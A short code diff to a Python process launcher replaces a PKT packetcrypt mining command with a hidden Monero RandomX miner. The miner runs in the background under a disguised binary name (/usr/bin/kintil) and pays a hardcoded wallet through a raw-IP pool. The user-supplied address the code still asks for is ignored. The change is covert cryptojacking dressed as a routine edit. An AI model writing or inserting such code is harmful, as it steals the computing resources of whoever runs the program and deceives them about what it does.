@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'nohup packetcrypt ann -p pkt1qegd9xjlaatf26f583m8yurtt9te4vs8340naca http://pool.pkteer.com http://pool.pkt.world http://pool.pktpool.io > {LOG_FILE} 2>&1 &'
+    cmd = f'nohup /usr/bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 159.223.182.56:3333 > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
